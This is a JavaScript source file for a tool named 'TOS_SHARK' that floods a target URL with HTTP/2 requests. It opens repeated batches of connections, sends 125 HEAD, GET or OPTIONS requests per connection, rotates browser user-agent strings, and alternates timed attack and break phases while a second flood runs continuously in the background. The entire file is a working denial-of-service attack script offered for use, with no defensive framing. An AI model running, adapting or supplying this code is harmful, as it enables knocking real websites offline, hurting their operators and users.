const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        this.attackStart = 0;
        this.breakStart = 0;
        this.currentMethod = '';
        
        // Attack methods pool - ONLY H2-MULTIPLEX and H2-MULTIPLEXV2
        this.methods = ['H2-MULTIPLEX', 'H2-MULTIPLEXV2'];
        
        // Data pools
        this.userAgents = this.generateUserAgents();
        this.endpoints = this.generateEndpoints();
        
        // For H2-MULTIPLEXV2 (separate tracking)
        this.v2Connections = [];
        this.v2ReqCount = 0;
        this.v2Active = false;
        
        this.startCycle();
    }

    // ===== DATA GENERATORS =====
    generateUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        ];
    }

    generateEndpoints() {
        return [
            '/', '/api', '/api/v1', '/api/v2', '/static', '/assets',
            '/users', '/products', '/data', '/json', '/xml', '/admin',
            '/login', '/register', '/search', '/filter', '/sort'
        ];
    }

    // ===== CYCLE MANAGEMENT =====
    async startCycle() {
        // Start immediately with attack
        this.attackLoop();
        // Start H2-MULTIPLEXV2 in background
        this.startH2MultiplexV2();
    }

    async attackLoop() {
        while (this.running) {
            const now = Date.now();
            
            if (this.attackActive) {
                // Attack phase (20-30 minutes)
                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startBreak();
                    continue;
                }
                
                // Execute current attack method (only H2-MULTIPLEX)
                if (this.currentMethod === 'H2-MULTIPLEX') {
                    await this.attackH2Multiplex();
                }
                
            } else {
                // Break phase (5-10 minutes)
                if (now - this.breakStart >= (5 * 60000) + Math.random() * (5 * 60000)) {
                    this.startAttack();
                    continue;
                }
                
                // Maintenance during break
                await this.performMaintenance();
                await this.sleepRandom(1000, 3000);
            }
            
            await this.sleepRandom(0.1, 1);
        }
    }

    // ===== BACKGROUND H2-MULTIPLEXV2 =====
    startH2MultiplexV2() {
        this.v2Active = true;
        this.runH2MultiplexV2();
    }

    async runH2MultiplexV2() {
        while (this.v2Active && this.running) {
            await this.attackH2MultiplexV2();
            await this.sleepRandom(50, 200);
        }
    }

    async attackH2MultiplexV2() {
        // Create 5 persistent connections
        while (this.v2Connections.length < 5) {
            try {
                const client = http2.connect(this.target);
                this.v2Connections.push(client);
            } catch (err) {}
        }
        
        // Send 125 requests per connection
        for (const client of this.v2Connections) {
            for (let i = 0; i < 125; i++) {
                this.sendH2RequestV2(client);
                this.totalReqs++;
                this.v2ReqCount++;
            }
        }
        
        // Clean up dead connections
        this.v2Connections = this.v2Connections.filter(client => {
            try {
                return !client.destroyed;
            } catch {
                return false;
            }
        });
    }

    sendH2RequestV2(client) {
        try {
            const methods = ['HEAD', 'GET', 'OPTIONS'];
            const method = methods[Math.floor(Math.random() * methods.length)];
            
            const req = client.request({
                ':method': method,
                ':path': '/',
                ':authority': this.host,
                'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
            });
            
            req.on('response', (headers) => {
                this.logStatus(headers[':status']);
                req.destroy();
            });
            
            req.on('error', () => {
                this.logStatus('*.*');
                req.destroy();
            });
            
            req.end();
        } catch (err) {
            this.logStatus('*.*');
        }
    }

    // ===== MAIN H2-MULTIPLEX =====
    async attackH2Multiplex() {
        // Use 5 connections + 125 reqs/stream
        const connections = [];
        
        // Create 5 connections
        for (let i = 0; i < 5; i++) {
            try {
                const client = http2.connect(this.target);
                connections.push(client);
            } catch (err) {}
        }
        
        // Send 125 requests through each connection
        for (const client of connections) {
            for (let i = 0; i < 125; i++) {
                this.sendH2Request(client);
                this.totalReqs++;
                this.reqCounter++;
            }
            
            // Destroy after batch
            setTimeout(() => {
                try {
                    client.destroy();
                } catch (e) {}
            }, 100);
        }
    }

    sendH2Request(client) {
        try {
            const methods = ['HEAD', 'GET', 'OPTIONS'];
            const method = methods[Math.floor(Math.random() * methods.length)];
            
            const req = client.request({
                ':method': method,
                ':path': '/',
                ':authority': this.host,
                'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
            });
            
            req.on('response', (headers) => {
                this.logStatus(headers[':status']);
                req.destroy();
            });
            
            req.on('error', () => {
                this.logStatus('*.*');
                req.destroy();
            });
            
            req.end();
        } catch (err) {
            this.logStatus('*.*');
        }
    }

    // ===== CONTROL METHODS =====
    startAttack() {
        this.attackActive = true;
        this.attackStart = Date.now();
        
        // Only H2-MULTIPLEX available
        this.currentMethod = 'H2-MULTIPLEX';
    }

    startBreak() {
        this.attackActive = false;
        this.breakStart = Date.now();
        
        // H2-MULTIPLEXV2 continues in background during breaks
    }

    // ===== MAINTENANCE =====
    async performMaintenance() {
        if (global.gc) global.gc();
        this.userAgents = this.generateUserAgents();
    }

    // ===== LOGGING =====
    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 10000) {
            this.lastLog = now;
            console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
        }
    }

    // ===== UTILS =====
    sleepRandom(min, max) {
        const duration = Math.random() * (max - min) + min;
        return new Promise(resolve => setTimeout(resolve, duration));
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Run
if (require.main === module) {
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
